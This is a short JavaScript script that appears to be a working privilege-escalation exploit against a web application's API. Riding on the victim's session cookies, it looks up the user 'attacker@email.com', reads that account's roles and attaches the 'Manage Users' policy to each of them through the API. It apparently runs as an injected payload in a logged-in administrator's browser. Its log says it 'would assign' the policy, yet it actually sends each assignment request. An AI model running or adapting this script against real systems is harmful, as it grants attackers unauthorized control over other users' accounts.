const EMAIL = "attacker@email.com";

async function apiRequest(body) {
    const res = await fetch("/api/", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(body),
        credentials: "include"
    });

    if (!res.ok) {
        throw new Error(`HTTP error: ${res.status}`);
    }

    return res.json();
}

async function runFlow() {
    try {
        const usersRes = await apiRequest({
            action: "GET",
            path: "users?per_page=500"
        });

        const user = usersRes.users.find(u => u.email === EMAIL);
        if (!user) throw new Error("User not found");

        const userId = user.id;
        console.log("User ID:", userId);

        const rolesRes = await apiRequest({
            action: "GET",
            path: `users/${userId}/roles`
        });

        const roles = rolesRes.roles.direct;
        if (!roles.length) throw new Error("No roles found");

        const roleIds = roles.map(r => r.id);
        console.log("Roles:", roleIds);

        const policiesRes = await apiRequest({
            action: "GET",
            path: "policies"
        });

        const policy = policiesRes.policies.find(
            p => p.name === "Manage Users"
        );

        if (!policy) throw new Error("Policy not found");

        const policyId = policy.id;
        console.log("Policy ID:", policyId);

        for (const roleId of roleIds) {
            console.log(`Would assign policy ${policyId} to role ${roleId}`);

            await apiRequest({
                action: "POST",
                path: `roles/${roleId}/policies/${policyId}`
            });
        }

        console.log("Flow completed");

    } catch (err) {
        console.error("Error:", err.message);
    }
}

runFlow();
